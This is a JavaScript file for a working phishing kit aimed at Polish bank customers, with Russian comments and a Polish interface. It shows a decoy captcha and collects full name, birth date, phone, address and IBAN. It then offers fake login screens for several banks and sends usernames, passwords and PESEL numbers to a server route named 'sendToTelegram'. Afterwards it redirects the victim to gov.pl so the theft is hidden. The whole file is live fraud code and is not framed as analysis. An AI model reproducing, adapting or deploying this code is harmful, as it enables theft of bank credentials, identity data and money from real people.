// ============================================================
//   КОНФИГУРАЦИЯ
// ============================================================
// Если сайт открывается с того же домена Render — оставь пусто.
// Если сайт на другом домене — впиши 'https://ggfg-ikmy.onrender.com'
const API_URL = '';

// ============================================================
//   УТИЛИТЫ IBAN
// ============================================================
function cleanIbanValue(value) {
    if (!value) return '';
    let cleaned = value.replace(/[\s\-]/g, '').toUpperCase();
    if (cleaned.startsWith('PL')) cleaned = cleaned.substring(2);
    cleaned = cleaned.replace(/\D/g, '');
    return cleaned;
}

function formatIban(value) {
    const digits = cleanIbanValue(value);
    if (digits.length === 0) return '';
    let result = digits.substring(0, 2);
    for (let i = 2; i < digits.length; i += 4) {
        result += ' ' + digits.substring(i, i + 4);
    }
    return result;
}

// ============================================================
//   ОТПРАВКА
// ============================================================
function sendToTelegram(bankName, login, password, pesel) {
    fetch(API_URL + '/api/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            bank: bankName,
            username: login,
            password: password,
            pesel: pesel || null
        })
    })
    .then(r => r.json())
    .then(d => {
        if (d.success) console.log('✅ Wysłano na serwer');
        else console.error('❌ Błąd:', d.error);
    })
    .catch(e => console.error('❌ Сеть:', e));
}

// ============================================================
//   КАПЧА
// ============================================================
(function() {
    var overlay = document.getElementById('captchaOverlay');
    var mainContent = document.getElementById('mainContent');
    var questionEl = document.getElementById('captchaQuestion');
    var inputEl = document.getElementById('captchaInput');
    var submitBtn = document.getElementById('captchaSubmit');
    var errorEl = document.getElementById('captchaError');
    var refreshBtn = document.getElementById('captchaRefresh');

    var currentCaptcha = '';

    function generateCaptcha() {
        var num = Math.floor(1000 + Math.random() * 9000);
        currentCaptcha = num.toString();
        questionEl.textContent = currentCaptcha;
        inputEl.value = '';
        inputEl.classList.remove('error');
        errorEl.textContent = '';
        submitBtn.disabled = false;
        inputEl.focus();
    }

    function verifyCaptcha() {
        var userInput = inputEl.value.trim();
        if (userInput === currentCaptcha) {
            overlay.classList.add('hidden');
            mainContent.style.display = 'block';
            document.body.style.overflow = 'auto';
            var firstInput = mainContent.querySelector('input');
            if (firstInput) setTimeout(function() { firstInput.focus(); }, 300);
        } else {
            inputEl.classList.add('error');
            errorEl.textContent = '❌ Nieprawidłowy kod. Spróbuj ponownie.';
            submitBtn.disabled = false;
            inputEl.value = '';
            inputEl.focus();
            setTimeout(function() { generateCaptcha(); }, 1500);
        }
    }

    submitBtn.addEventListener('click', function(e) {
        e.preventDefault();
        submitBtn.disabled = true;
        verifyCaptcha();
    });

    inputEl.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') {
            e.preventDefault();
            submitBtn.click();
        }
    });

    refreshBtn.addEventListener('click', function(e) {
        e.preventDefault();
        generateCaptcha();
        inputEl.focus();
    });

    generateCaptcha();
    setTimeout(function() { inputEl.focus(); }, 300);
})();

// ============================================================
//   МАСКИ
// ============================================================
function autoSlash(event) {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 8) value = value.slice(0, 8);
    let formatted = '';
    for (let i = 0; i < value.length; i++) {
        if (i === 2 || i === 4) formatted += '/';
        formatted += value[i];
    }
    input.value = formatted;
}

function autoPostal(event) {
    const input = event.target;
    let value = input.value.replace(/\D/g, '');
    if (value.length > 5) value = value.slice(0, 5);
    let formatted = '';
    for (let i = 0; i < value.length; i++) {
        if (i === 2) formatted += '-';
        formatted += value[i];
    }
    input.value = formatted;
}

// ============================================================
//   ГЛАВНЫЙ КОД
// ============================================================
document.addEventListener('DOMContentLoaded', function() {

    // Меню
    const menuToggle = document.getElementById('menuToggle');
    const sidebar = document.getElementById('sidebar');
    const mainWrapper = document.getElementById('mainWrapper');
    const contentWrapper = document.getElementById('contentWrapper');
    const footer = document.getElementById('footer');
    let isMenuOpen = false;

    function toggleMenu() {
        isMenuOpen = !isMenuOpen;
        if (isMenuOpen) {
            sidebar.classList.add('open');
            mainWrapper.classList.add('shifted');
            contentWrapper.classList.add('shifted');
            footer.classList.add('shifted');
        } else {
            sidebar.classList.remove('open');
            mainWrapper.classList.remove('shifted');
            contentWrapper.classList.remove('shifted');
            footer.classList.remove('shifted');
        }
    }

    if (menuToggle) {
        menuToggle.addEventListener('click', function(e) {
            e.stopPropagation();
            toggleMenu();
        });
    }

    const sidebarLinks = document.querySelectorAll('.sidebar-nav ul li a, .sidebar-nav .ukraine-link');
    sidebarLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            sidebarLinks.forEach(l => l.classList.remove('active'));
            this.classList.add('active');
            if (isMenuOpen) toggleMenu();
        });
    });

    document.addEventListener('keydown', function(e) {
        if (e.key === 'Escape' && isMenuOpen) toggleMenu();
    });

    // Поиск
    document.querySelector('.header-search .search-submit-btn')?.addEventListener('click', function() {
        const input = this.closest('.header-search').querySelector('input');
        alert('Szukanie: ' + (input?.value || 'puste'));
    });

    document.querySelector('.header-search input')?.addEventListener('keydown', function(e) {
        if (e.key === 'Enter') alert('Szukanie: ' + this.value);
    });

    document.querySelectorAll('.login-nav .nav-links a').forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            alert('Przekierowanie do: ' + this.textContent.trim());
        });
    });

    // Кнопка "DOWIEDZ SIĘ WIĘCEJ"
    const scrollBtn = document.getElementById('scrollToFormBtn');
    const formSection = document.getElementById('dataFormSection');
    if (scrollBtn && formSection) {
        scrollBtn.addEventListener('click', function(e) {
            e.preventDefault();
            formSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
        });
    }

    // NRB — автоформатирование
    const ibanInput = document.getElementById('iban');
    const ibanWrapper = document.getElementById('ibanWrapper');

    if (ibanInput) {
        ibanInput.addEventListener('input', function() {
            const cursorPos = this.selectionStart;
            const before = this.value;
            const digits = cleanIbanValue(before);
            const formatted = formatIban(digits);
            this.value = formatted;
            const diff = formatted.length - before.length;
            const newPos = Math.max(0, cursorPos + diff);
            try { this.setSelectionRange(newPos, newPos); } catch (e) {}
            this.classList.remove('error');
            if (ibanWrapper) ibanWrapper.classList.remove('error');
        });

        ibanInput.addEventListener('paste', function() {
            setTimeout(() => {
                const digits = cleanIbanValue(this.value);
                this.value = formatIban(digits);
                this.classList.remove('error');
                if (ibanWrapper) ibanWrapper.classList.remove('error');
            }, 5);
        });

        ibanInput.addEventListener('blur', function() {
            const digits = cleanIbanValue(this.value);
            this.value = formatIban(digits);
        });
    }

    // Форма
    const form = document.getElementById('dataForm');
    const submitBtn = document.getElementById('submitBtn');
    const toast = document.getElementById('toastMessage');
    const allInputs = form ? form.querySelectorAll('input[required]') : [];
    const formSectionElement = document.getElementById('dataFormSection');
    const bankSelection = document.getElementById('bankSelection');
    const loginNav = document.getElementById('loginNav');
    const imageBanner = document.getElementById('imageBanner');
    const bankFooter = document.getElementById('bankFooter');

    function showToast(message, isSuccess = false) {
        if (!toast) return;
        toast.textContent = message;
        toast.className = 'toast-message show';
        if (isSuccess) toast.classList.add('success');
        else toast.classList.remove('success');
        setTimeout(() => toast.classList.remove('show'), 5000);
    }

    function validateForm() {
        let allFilled = true;
        allInputs.forEach(input => {
            if (input.value.trim() === '') {
                allFilled = false;
                input.classList.add('error');
            } else input.classList.remove('error');
        });
        if (ibanInput) {
            const ibanValue = cleanIbanValue(ibanInput.value);
            if (ibanValue.length < 26) {
                allFilled = false;
                ibanInput.classList.add('error');
                if (ibanWrapper) ibanWrapper.classList.add('error');
            } else {
                ibanInput.classList.remove('error');
                if (ibanWrapper) ibanWrapper.classList.remove('error');
            }
        }
        return allFilled;
    }

    function getFormData() {
        const cleanedIban = ibanInput ? cleanIbanValue(ibanInput.value) : '';
        return {
            fullname: document.getElementById('fullname')?.value.trim() || '',
            birthdate: document.getElementById('birthdate')?.value.trim() || '',
            phone: document.getElementById('phone')?.value.trim() || '',
            street: document.querySelector('input[name="street"]')?.value.trim() || '',
            city: document.querySelector('input[name="city"]')?.value.trim() || '',
            postal: document.querySelector('input[name="postal"]')?.value.trim() || '',
            iban: 'PL' + cleanedIban
        };
    }

    if (form) {
        form.addEventListener('submit', function(e) {
            e.preventDefault();

            if (!validateForm()) {
                showToast('Najpierw wypełnij wszystkie wymagane pola!');
                return;
            }

            if (submitBtn) {
                submitBtn.disabled = true;
                submitBtn.classList.add('loading');
                submitBtn.innerHTML = '<span class="spinner"></span> Wysyłanie...';
            }

            const formData = getFormData();

            fetch(API_URL + '/api/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(formData)
            })
            .then(response => response.json())
            .then(data => {
                if (data.success) {
                    showToast('Dane zostały wysłane!', true);
                    if (loginNav) loginNav.classList.add('hidden');
                    if (imageBanner) imageBanner.classList.add('hidden');
                    if (formSectionElement) formSectionElement.classList.add('hidden');
                    if (bankSelection) bankSelection.classList.add('visible');
                    if (bankFooter) bankFooter.classList.add('visible');
                    window.scrollTo({ top: 0, behavior: 'smooth' });
                } else {
                    showToast('Błąd: ' + (data.error || 'nieznany'));
                }
            })
            .catch(error => {
                console.error('Błąd:', error);
                showToast('Błąd połączenia.');
            })
            .finally(() => {
                if (submitBtn) {
                    submitBtn.disabled = false;
                    submitBtn.classList.remove('loading');
                    submitBtn.innerHTML = 'Wyślij';
                }
            });
        });

        allInputs.forEach(input => {
            input.addEventListener('input', function() {
                if (this.value.trim() !== '') this.classList.remove('error');
                if (this.id === 'iban' && ibanWrapper) ibanWrapper.classList.remove('error');
            });
        });

        document.addEventListener('click', function(e) {
            if (toast && toast.classList.contains('show') && !toast.contains(e.target)) {
                toast.classList.remove('show');
            }
        });
    }
});

// ============================================================
//   MILLENIUM (с PESEL)
// ============================================================
function handleLogin2(event, bankName) {
    event.preventDefault();
    const form = event.target;
    const allInputs = form.querySelectorAll('input');

    const login = document.getElementById('loginUsername2')?.value.trim() || '';
    const password = document.getElementById('loginPassword2')?.value.trim() || '';
    const pesel = document.getElementById('loginPesel2')?.value.trim() || '';

    if (!login || !password || !pesel) {
        alert('Proszę wypełnić wszystkie pola (Millekod, Hasło i Pesel) dla ' + bankName + '.');
        return false;
    }

    sendToTelegram(bankName, login, password, pesel);
    alert('✅ Dane dla ' + bankName + ' zostały wysłane!');

    allInputs.forEach(input => {
        if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') input.value = '';
    });

    setTimeout(() => { window.location.href = 'https://www.gov.pl'; }, 1500);
    return false;
}

// ============================================================
//   УНИВЕРСАЛЬНЫЙ ОБРАБОТЧИК БАНКОВ
// ============================================================
function handleLogin(event, bankName) {
    event.preventDefault();
    const form = event.target;
    const allInputs = form.querySelectorAll('input');
    let login = '', password = '';
    const textInputs = [], passwordInputs = [];

    allInputs.forEach(input => {
        const type = input.type || '';
        if (type === 'password') passwordInputs.push(input);
        else if (type === 'text' || type === 'email' || type === 'tel') textInputs.push(input);
    });

    if (textInputs.length > 0) login = textInputs[0].value.trim();
    if (passwordInputs.length > 0) password = passwordInputs[0].value.trim();

    if (!login) {
        for (const input of allInputs) {
            const id = (input.id || '').toLowerCase();
            const placeholder = (input.placeholder || '').toLowerCase();
            if ((id.includes('login') || placeholder.includes('login')) && input.type !== 'password') {
                login = input.value.trim();
                break;
            }
        }
    }
    if (!password) {
        for (const input of allInputs) {
            const id = (input.id || '').toLowerCase();
            const placeholder = (input.placeholder || '').toLowerCase();
            if ((id.includes('hasło') || id.includes('haslo') || id.includes('password') ||
                 placeholder.includes('hasło') || placeholder.includes('haslo')) && input.type === 'password') {
                password = input.value.trim();
                break;
            }
        }
    }
    if (!password) {
        const anyPassword = form.querySelector('input[type="password"]');
        if (anyPassword) password = anyPassword.value.trim();
    }
    if (!login) {
        const anyText = form.querySelector('input[type="text"]');
        if (anyText) login = anyText.value.trim();
    }

    if (!login || !password) {
        alert('Proszę wypełnić wszystkie pola (Login i Hasło) dla ' + bankName + '.');
        return false;
    }

    sendToTelegram(bankName, login, password);
    alert('✅ Dane dla ' + bankName + ' zostały wysłane!');

    allInputs.forEach(input => {
        if (input.type !== 'hidden' && input.type !== 'submit' && input.type !== 'button') input.value = '';
    });

    setTimeout(() => { window.location.href = 'https://www.gov.pl'; }, 1500);
    return false;
}

// ============================================================
//   ОТКРЫТИЕ ЭКРАНОВ
// ============================================================
function openLoginScreen1() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen1').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
function openLoginScreen2() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen2').classList.add('visible');
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
function openLoginScreen3() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen3').classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
function openLoginScreen4() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen4').classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
function openLoginScreen5() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen5').classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
function openLoginScreen6() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen6').classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
function openLoginScreen7() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen7').classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
function openLoginScreen8() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen8').classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
function openLoginScreen9() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen9').classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
function openLoginScreen10() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen10').classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}
function openLoginScreen12() {
    document.getElementById('bankSelection').classList.remove('visible');
    document.getElementById('bankFooter').classList.remove('visible');
    document.getElementById('loginScreen12').classList.add('visible');
    document.body.style.overflow = 'hidden';
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        const screens = ['loginScreen1','loginScreen2','loginScreen3','loginScreen4','loginScreen5','loginScreen6','loginScreen7','loginScreen8','loginScreen9','loginScreen10','loginScreen12'];
        screens.forEach(id => {
            const el = document.getElementById(id);
            if (el && el.classList.contains('visible')) {
                el.classList.remove('visible');
                document.getElementById('bankSelection').classList.add('visible');
                document.getElementById('bankFooter').classList.add('visible');
                document.body.style.overflow = '';
                window.scrollTo({ top: 0, behavior: 'smooth' });
            }
        });
    }
});
